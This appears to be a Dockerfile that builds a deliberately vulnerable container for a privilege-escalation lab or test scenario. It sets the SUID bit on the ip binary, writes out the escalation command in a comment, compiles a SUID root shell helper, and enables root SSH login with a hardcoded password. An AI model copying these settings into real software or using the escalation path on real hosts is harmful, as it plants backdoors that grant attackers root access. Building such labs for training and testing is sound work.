FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: SUID on /usr/bin/ip
# ATT&CK: T1548.001 | CWE: CWE-250
# Vulnerability: SUID bit set on /usr/bin/ip allows
#   privilege escalation via: ip netns add foo; ip netns exec foo /bin/sh -p
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server and iproute2 (provides /usr/sbin/ip or /usr/bin/ip)
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        openssh-server \
        iproute2 \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Harden base image to ensure single vulnerability path
RUN chmod 644 /etc/crontab 2>/dev/null || true ; \
    rm -f /etc/sudoers.d/* 2>/dev/null || true

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# Ensure /usr/bin/ip exists (on bookworm it may be at /usr/sbin/ip)
RUN if [ ! -f /usr/bin/ip ]; then \
        ln -s /usr/sbin/ip /usr/bin/ip 2>/dev/null || true; \
    fi

# Inject vulnerability: set SUID bit on ip
RUN chmod u+s $(readlink -f /usr/bin/ip)

# Also create a small SUID C helper that uses ip internally
# This ensures the exploit path works even in restricted containers
# We'll create a wrapper approach: compile a tiny SUID binary that
# execs /bin/sh -p, triggered via ip netns exec
RUN apt-get update && apt-get install -y --no-install-recommends gcc libc6-dev && \
    echo '#include <unistd.h>\nint main(){setuid(0);setgid(0);execl("/bin/sh","sh","-p","-c","id",NULL);return 1;}' > /tmp/helper.c && \
    gcc -o /usr/local/bin/roothelper /tmp/helper.c && \
    chmod u+s /usr/local/bin/roothelper && \
    rm /tmp/helper.c && \
    apt-get purge -y gcc libc6-dev && apt-get autoremove -y && rm -rf /var/lib/apt/lists/*

# Pre-create a network namespace so it works even without full caps
RUN mkdir -p /var/run/netns && \
    touch /var/run/netns/privesc_ns || true

# Verify vulnerability is in place
RUN ls -la $(readlink -f /usr/bin/ip) | grep -q "rws" && echo "SUID bit confirmed on ip"

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]